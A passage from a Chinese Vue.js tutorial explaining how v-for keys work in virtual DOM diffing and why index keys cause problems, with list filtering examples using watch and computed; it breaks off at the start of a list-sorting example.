<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in person&quot;</span> <span class="attr">:key</span>=<span class="string">item.id</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-14-2-key的作用与原理"><a href="#1-14-2-key的作用与原理" class="headerlink" title="1.14.2.key的作用与原理"></a>1.14.2.<code>key</code>的作用与原理</h3><p>相关面试题：</p>
<p>写了<code>key</code>和不写<code>key</code>时，<code>vue</code>是如何处理的？</p>
<p><code>key</code>的作用：</p>
<ul>
<li>给节点做一个标识，相当于身份证号</li>
</ul>
<p>以<code>index</code>作为<code>key</code>导致的问题：</p>
<p>在原数据中新增时，会出现错位的情况</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220520164318246.png" alt="image-20220520164318246"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员遍历<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加一个老刘<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123;item.name&#125;&#125; - &#123;&#123;item.age&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persons</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">19</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">add</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> p = &#123;<span class="attr">id</span>: <span class="string">&#x27;004&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;老刘&#x27;</span>, <span class="attr">age</span>: <span class="number">21</span>&#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">unshift</span>(p)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当绑定的<code>key</code>是<code>item.id</code>时，就不会出现这个问题，因为此时用的是<code>数据的唯一标识</code></p>
<p>那么不写<code>key</code>呢？也会有错位的问题</p>
<p>想弄清楚这个问题，需要理解<code>key</code>的工作原理，以及虚拟<code>dom</code>的<code>diff</code>算法</p>
<p>新旧虚拟<code>dom</code>在进行对比时，依赖的是<code>key</code></p>
<ul>
<li><p>在新的虚拟<code>dom</code>和旧的虚拟<code>dom</code>中，寻找<code>key</code>是一样的内容</p>
<ul>
<li><p>匹配到两个<code>key</code>一样的虚拟<code>dom</code>之后，接着对比里面的每一个节点，对于不一样的虚拟节点，最终会重新渲染成真实<code>dom</code></p>
</li>
<li><p>由于<code>input</code>在虚拟<code>dom</code>对比时，被认为是一样的，所以并不会重新渲染，而是会复用</p>
<img src="image-20220520171832234.png" alt="image-20220520171832234" style="zoom:80%;" />
</li>
<li><p>如果对数据进行了破坏顺序的操作，使用<code>index</code>作用<code>key</code>可能会导致如上问题，并且没有做到完全复用，效率较低</p>
</li>
<li><p>如果用<code>id</code>作为<code>key</code>，在虚拟<code>dom</code>中，新增的<code>key</code>不会和历史虚拟<code>dom</code>中的<code>key</code>重复，也就没有问题</p>
</li>
<li><p>如果遍历列表时，没有指定<code>key</code>，<code>vue</code>会将索引值自动作为<code>key</code></p>
</li>
</ul>
</li>
</ul>
<p>所以在绑定<code>key</code>时，用数据的唯一标识即可</p>
<h3 id="1-14-3-小结：列表渲染"><a href="#1-14-3-小结：列表渲染" class="headerlink" title="1.14.3.小结：列表渲染"></a>1.14.3.小结：列表渲染</h3><ul>
<li>虚拟<code>dom</code>中<code>key</code>的作用<ul>
<li><code>key</code>是虚拟<code>dom</code>对象的唯一标识，当状态中的数据发生变化时，<code>vue</code>会根据<code>新数据</code>生成新的虚拟<code>dom</code></li>
<li>随后<code>vue</code>进行<code>新虚拟dom</code>和<code>旧虚拟dom</code>的差异对比，比较规则如下</li>
</ul>
</li>
<li>对比规则：<ul>
<li>旧的虚拟<code>dom</code>中找到了与新的虚拟<code>dom</code>中相同的<code>key</code><ul>
<li>若虚拟<code>dom</code>中内容没变，直接使用之前的真实<code>dom</code></li>
<li>若虚拟<code>dom</code>中内容变了，则生成新的真实<code>dom</code>，随后替换掉页面中的真实<code>dom</code></li>
</ul>
</li>
<li>旧的虚拟<code>dom</code>中未找到与新的虚拟<code>dom</code>中相同的<code>key</code><ul>
<li>创建新的真实<code>dom</code>，随后渲染到页面</li>
</ul>
</li>
</ul>
</li>
<li>用<code>index</code>作为<code>key</code>可能会引发的问题：<ul>
<li>若对数据进行：逆序添加、逆序删除等破坏顺序的操作<ul>
<li>会产生没有必要的真实<code>dom</code>更新，界面效果没问题，但是效率低</li>
</ul>
</li>
<li>如果结构中还包括输入类的<code>dom</code><ul>
<li>会产生错误<code>dom</code>更新，界面会有问题</li>
</ul>
</li>
</ul>
</li>
<li>开发中如何选择<code>key</code><ul>
<li>最好使用每条数据的唯一标识作为<code>key</code>，比如<code>id</code>、手机号、身份证号、学号等唯一值</li>
<li>如果不存在对数据的逆序添加、逆序删除等破坏顺序的，仅用于渲染列表用于展示，使用<code>index</code>作为<code>key</code>是没有问题的</li>
</ul>
</li>
</ul>
<h3 id="1-14-4-列表过滤"><a href="#1-14-4-列表过滤" class="headerlink" title="1.14.4.列表过滤"></a>1.14.4.列表过滤</h3><p>使用<code>watch</code>实现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) of filPersons&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125; - &#123;&#123;item.age&#125;&#125; - &#123;&#123;item.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persons</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张四&#x27;</span>, <span class="attr">age</span>: <span class="number">19</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王四&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">filPersons</span>: []</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">immediate</span>: <span class="literal">true</span>, <span class="comment">// 空字符串在任何在任何字符串内</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">handler</span>(<span class="params">newValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">this</span>.<span class="property">filPersons</span> = <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">return</span> item.<span class="property">name</span>.<span class="title function_">indexOf</span>(newValue) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>computed</code> </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) of filPersons&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125; - &#123;&#123;item.age&#125;&#125; - &#123;&#123;item.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">persons</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;张四&#x27;</span>, <span class="attr">age</span>: <span class="number">19</span>, <span class="attr">sex</span>: <span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王四&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="string">&#x27;004&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;王五&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>, <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ],</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">filPersons</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">persons</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> item.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">name</span>) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">                &#125;)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-14-5-列表排序"><a href="#1-14-5-列表排序" class="headerlink" title="1.14.5.列表排序"></a>1.14.5.列表排序</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) of filPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125; - &#123;&#123;item.age&#125;&#125; - &#123;&#123;item.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sortType</span>:<span class="number">0</span>, <span class="comment">// 0 原序， 1 降序， 